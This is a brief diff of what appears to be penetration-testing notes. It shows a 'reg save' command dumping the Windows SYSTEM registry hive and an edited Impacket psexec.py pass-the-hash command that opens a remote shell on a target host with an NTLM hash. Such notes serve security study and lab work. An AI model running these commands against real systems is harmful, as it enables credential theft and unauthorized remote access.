@@ -77,6 +77,6 @@ reg save HKLM\SYSTEM SYSTEM.backup
 ```
 
 ```
-psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:f58b86e89c8631e432cf1a034662853f' WORKGROUP/administrator@10.11.1.31 cmd
+psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:f58b86e89c8631e432cf1a0232362853f' WORKGROUP/administrator@11.111.128.10 cmd
 ```
 
